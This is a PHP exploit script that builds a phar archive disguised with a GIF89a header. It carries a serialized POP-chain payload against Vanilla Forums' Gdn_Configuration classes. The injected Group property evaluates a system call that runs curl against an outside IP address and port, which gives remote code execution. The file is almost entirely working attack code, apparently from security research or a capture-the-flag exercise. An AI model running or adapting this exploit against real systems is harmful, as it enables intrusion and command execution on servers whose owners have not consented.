<?php
// reference : https://srcincite.io/blog/2018/10/02/old-school-pwning-with-new-school-tricks-vanilla-forums-remote-code-execution.html
// custom pop chain
class Gdn_ConfigurationSource{
    public function __construct(){
        $this->Type = "file";
        $this->Source = "/var/www/html/uploads/output2";
        $this->Group = 'a=eval("system("curl 140.112.30.39:12005");");//';
        $this->Settings[""] = "";       
        $this->Dirty = true;
        $this->ClassName = "Gdn_ConfigurationSource";
    }
}
class Gdn_Configuration {
    public $sources = [];
    public function __construct(){
        $this->sources['si'] = new Gdn_ConfigurationSource();
    }
}


@unlink("phar.phar");
$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); //设置stub，增加gif文件头
# function __construct($m, $f, $c=null) {
$o = new Gdn_Configuration();
$phar->setMetadata($o); 
$phar->addFromString("OAO.oAo","OAO");
$phar->stopBuffering();

?>